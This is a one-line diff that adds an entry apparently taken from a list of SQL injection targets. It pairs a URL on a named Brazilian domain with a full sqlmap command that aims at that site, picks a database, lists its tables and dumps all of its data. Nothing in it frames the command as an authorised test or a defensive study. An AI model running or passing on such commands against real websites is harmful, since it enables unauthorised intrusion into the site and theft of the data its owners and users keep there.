@@ -1,0 +1,1 @@
+http://www.doia.com.br/?act{6}&ace{id}=13 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.doia.com.br/?act{6}&ace{id}=13 -D mysql_101 --tables --dump-all
